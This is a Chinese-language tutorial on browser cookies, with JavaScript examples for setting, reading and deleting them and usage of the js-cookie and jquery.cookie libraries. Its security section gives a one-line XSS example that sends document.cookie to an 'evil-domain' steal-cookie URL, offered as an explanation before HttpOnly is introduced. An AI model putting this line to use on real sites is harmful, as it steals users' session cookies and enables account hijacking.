# Cookie



JavaScript Cookie

#### 一、什么是Cookie

`Cookie`，小型文本文本，是某些网站为了辨别用户身份而加密存储在用户本地终端上的数据（来自维基百科）

**1、分类**

`Cookie`总是保存在客户端中，按在客户端中的存储位置，可分为**内存`Cookie`**和**硬盘`Cookie`**。

内存`cookie`由浏览器维护，保存在内存中，浏览器关闭后就消失了，存在时间是短暂的。

硬盘`cookie`保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，到了过期时间，硬盘`cookie`不会被删除，存在时间是长期的。

所以按照存在时间，分为**非持久`cookie`**和**持久`cookie`**。

**2、用途**

`Web`浏览器和服务器使用`HTTP`协议进行通信，因为`HTTP`是无状态协议，所以服务器不知道用户上一次做了什么，不利于交互式`Web`应用程序的实现。但对于商业网站，需要在不同页面之间维护会话信息。服务器可以设置或读取`Cookies`中包含信息，借此维护用户跟服务器[会话](https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D_%28%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%29)中的状态。

`Cookie`另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种[加密](https://zh.wikipedia.org/wiki/%E5%8A%A0%E5%AF%86)形式）的`Cookie`到用户的硬盘上。第二次登录时，如果该`Cookie`尚未到期，浏览器会发送该`Cookie`，服务器验证凭据，用户不必输入用户名和密码就可以登录了。

在许多情况下，使用Cookie是记住和跟踪偏好以及更好的提高访问者体验或网站统计所需的其他信息的最有效方法。

`Cookie`主要用于以下三个方面：

* 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
* 个性化设置（如用户自定义设置、主题等）
* 浏览器行为跟踪（如跟踪分析用户行为等）

**3、缺点**

1. `Cookie`会被附加在每个`HTTP`请求中，所以无形中增加了性能开销
2. 由于在`HTTP`请求中的`Cookie`是明文传递的，所以存在安全性问题，除非用`HTTPS`
3. Cookie的大小限制在4KB左右，对于复杂的存储需求来说是不够用的

新的浏览器`API`已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

#### 二、Cookie操作

当服务器收到`HTTP`请求时，服务器可以在响应头里面添加一个[`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie)选项。浏览器收到响应后通常会保存下`Cookie`，之后对该服务器每一次请求中都通过[`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie)请求头部将`Cookie`信息发送给服务器，服务器会知道/记住之前访问的内容。另外，`Cookie`的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

* 过期时间（`Expires*`）：如果这是空白，则访问者退出浏览器时cookie将过期
* 域（`Domain`）：网站域名
* 路径（`Path`）：设置`cookie`的目录或网页的路径
* 有效期：

`JavaScript`可以使用`Document`对象的`cookie`属性来操作`cookie` 。`JavaScript`可以读取、创建、修改和删除适用于当前网页的`cookie`。

**1、创建Cookie**

创建`cookie`的最简单方法是为`document.cookie`对象分配一个字符串值:

```text
document.cookie = "key1 = value1;key2 = value2;expires = date";
```

这里的**expires**属性是可选的。如果您为此属性提供有效的日期或时间，则cookie将在给定的日期或时间到期，此后，cookie的值将无法访问。

**设置Cookie过期时间**

通过设置过期日期并在cookie中保存到期日期来延长`cookie`的生命周期，使其超出当前浏览器会话。这可以通过将**'expires'**属性设置为日期和时间来完成。

```text
<html>
   <head>   
      <script type = "text/javascript">
         <!--
            function WriteCookie() {
               var now = new Date();
               now.setMonth( now.getMonth() + 1 );
               cookievalue = escape(document.myform.customer.value) + ";"
               
               document.cookie = "name=" + cookievalue;
               document.cookie = "expires=" + now.toUTCString() + ";"
               document.write ("Setting Cookies : " + "name=" + cookievalue );
            }
         //-->
      </script>      
   </head>
   
   <body>
      <form name = "myform" action = "">
         Enter name: <input type = "text" name = "customer"/>
         <input type = "button" value = "Set Cookie" onclick = "WriteCookie()"/>
      </form>      
   </body>
</html>
```

**2、获取Cookie**

```text
<html>
   <head>   
      <script type = "text/javascript">
         <!--
            function ReadCookie() {
               var allcookies = document.cookie;
               document.write ("All Cookies : " + allcookies );
               
               // Get all the cookies pairs in an array
               cookiearray = allcookies.split(';');
               
               // Now take key value pair out of this array
               for(var i=0; i<cookiearray.length; i++) {
                  name = cookiearray[i].split('=')[0];
                  value = cookiearray[i].split('=')[1];
                  document.write ("Key is : " + name + " and Value is : " + value);
               }
            }
         //-->
      </script>      
   </head>
   
   <body>     
      <form name = "myform" action = "">
         <p> click the following button and see the result:</p>
         <input type = "button" value = "Get Cookie" onclick = "ReadCookie()"/>
      </form>      
   </body>
</html>
```

**3、删除Cookie**

只需将到期日期设置为过去的时间。

```text
<html>
   <head>   
      <script type = "text/javascript">
         <!--
            function WriteCookie() {
               var now = new Date();
               now.setMonth( now.getMonth() - 1 );
               cookievalue = escape(document.myform.customer.value) + ";"
               
               document.cookie = "name=" + cookievalue;
               document.cookie = "expires=" + now.toUTCString() + ";"
               document.write("Setting Cookies : " + "name=" + cookievalue );
            }
          //-->
      </script>      
   </head>
   
   <body>
      <form name = "myform" action = "">
         Enter name: <input type = "text" name = "customer"/>
         <input type = "button" value = "Set Cookie" onclick = "WriteCookie()"/>
      </form>      
   </body>
</html>
```

#### 三、轻量级Cookie插件

**js-cookie.js**

**1、引入**

**（1）直接引入CDN或者本地下载引入**

```text
// CDN
<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
// 本地
<script src="./js/js.cookie.js"></script>
```

**（2）模块化**

```text
npm install js-cookie
```

```text
import Cookir form js-cookie
```

**2、使用**

**（1）设置cookie**

```text
Cookies.set('name', 'value', { expires: 7, path: '' }); //7天过期
```

**（2）读取cookie**

```text
Cookies.get('name'); //获取cookie
​
Cookies.get(); //读取所有的cookie
```

**（3）删除cookie**

```text
Cookies.remove('name'); //删除cookie时必须是同一个路径。
```

**jquery.cookie.js**

**1、引入**

```text
<script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
​
<script type="text/javascript" src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
```

**2、使用**

**（1）创建cookie**

```text
//创建一个会话cookie，所创建的cookie有效期默认到用户浏览器关闭止
$.cookie("name","AmberYLopez");
​
//创建一个持久cookie，指明时间时，故称为持久cookie，并且有效时间为7天
$.cookie("name","AmberYLopez",｛expires:7｝);
​
//创建一个持久并带有效路径的cookie
//如果不设置有效路径，在默认情况下，只能在cookie设置当前页面读取该cookie，cookie的路径用于设置能够读取cookie的顶级目录。
$.cookie("name","AmberYLopez",｛expires:7,path:'/'｝);
​
//创建一个持久并带有效路径和域名的cookie
//domain：创建cookie所在网页所拥有的域名；secure：默认是false，如果为true，cookie的传输协议需为https；
//raw：默认为false，读取和写入时候自动进行编码和解码（使用encodeURIComponent编码，使用decodeURIComponent解码），关闭这个功能，请设置为true。
$.cookie("name","AmberYLopez",｛expires:7,path:'/',domain:'chuhoo.com',secure:false,raw:false｝);
```

**（2）获取cookie**

```text
$.cookie("name"); 
 //如果存在则返回AmberYLopez，否则返回null。
```

**（3）删除cookie**

```text
$.cookie("name",null);
```

#### 四、安全性

保护`cookie`不被非法访问的唯一方法是将它放在另一个域名/子域名之下,，利用[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)保护其不被读取。

`Web`应用程序通常使用`cookies`来标识用户身份及他们的登录会话.。因此通过窃听这些`cookie`， 就可以劫持已登录用户的会话.，窃听的`cookie`的常见方法包括CSRF攻击和XSS攻击

```text
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 属性可以阻止通过`javascript`访问`cookie`，从而一定程度上遏制这类攻击。

> 参考资料：
>
> [Cookie-维基百科](https://zh.wikipedia.org/wiki/Cookie)
>
> [Document.cookie](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie)
>
> [js-cookie.js的使用](https://juejin.im/post/5b56e2a45188251abb46ba60)
>
> [Js 操作Cookie](https://www.jianshu.com/p/ff10547a3587)

